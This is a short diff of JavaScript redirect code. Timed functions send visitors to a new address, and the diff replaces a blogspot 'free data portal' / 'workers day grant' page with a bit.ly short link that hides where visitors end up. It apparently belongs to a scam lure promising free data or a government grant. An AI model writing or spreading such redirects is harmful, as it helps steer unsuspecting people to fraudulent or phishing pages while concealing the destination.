@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://sms-free-data-portal.blogspot.com/p/fg-workers-day-grant.html";
+        location.href="https://bit.ly/yhauajjdng";
     }
     function goon(){
-        location.href="https://sms-free-data-portal.blogspot.com/p/fg-workers-day-grant.html";
+        location.href="https://bit.ly/yhauajjdng";
     }
